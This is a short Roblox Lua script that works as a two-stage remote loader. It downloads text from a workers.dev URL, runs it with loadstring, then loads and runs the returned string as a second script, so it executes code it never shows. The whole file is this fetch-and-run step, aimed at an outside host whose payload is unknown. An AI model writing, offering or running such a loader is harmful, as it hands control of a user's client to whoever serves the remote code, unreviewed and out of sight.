local response = game:HttpGet("https://sixt9uvbx4cygenknncfe1ampwxye9mcuuzpine.johnluke12012.workers.dev/")

local fn, loadError = loadstring(response)
local success, result = pcall(fn)

local innerFn, innerLoadError = loadstring(result)
if not innerFn then
    warn("Inner load error:", innerLoadError)
    return
    else
end
local innerSuccess, innerResult = pcall(innerFn)
if not innerSuccess then
    warn("Inner execution error:", innerResult)
    return
end
